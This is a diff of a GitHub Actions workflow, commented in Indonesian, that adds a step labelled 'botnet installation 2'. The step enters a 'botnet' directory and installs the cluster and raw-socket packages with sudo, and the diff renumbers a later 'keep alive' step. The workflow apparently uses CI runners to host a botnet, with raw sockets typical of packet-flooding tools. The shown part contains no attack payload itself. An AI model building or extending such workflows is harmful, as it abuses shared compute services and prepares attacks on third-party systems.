@@ -144,11 +144,26 @@ jobs:
           echo "PENGINSTALAN BOTNET SELESAI❤️‍🔥👍😋"
           echo "=================================="
 
+# ===============================
+      # 6. Penginstalan botnet 2
+      # ===============================
+      - name: 6. Penginstalan botnet 2
+        shell: bash
+        run: |
+          echo "=================================="
+          echo "PENGINSTALAN BOTNET SEDANG DI PROSES⚡⚡🌀"
+
+          cd botnet
+          sudo yarn add cluster raw-socket
+
+          echo "=================================="
+          echo "PENGINSTALAN BOTNET SELESAI❤️‍🔥👍😋"
+          echo "=================================="
 
       # ===============================
-      # 6. INFO + KEEP ALIVE
+      # 7. INFO + KEEP ALIVE
       # ===============================
-      - name: 5. Info & Keep Alive
+      - name: 7. Info & Keep Alive
         shell: bash
         run: |
           echo "======================================"
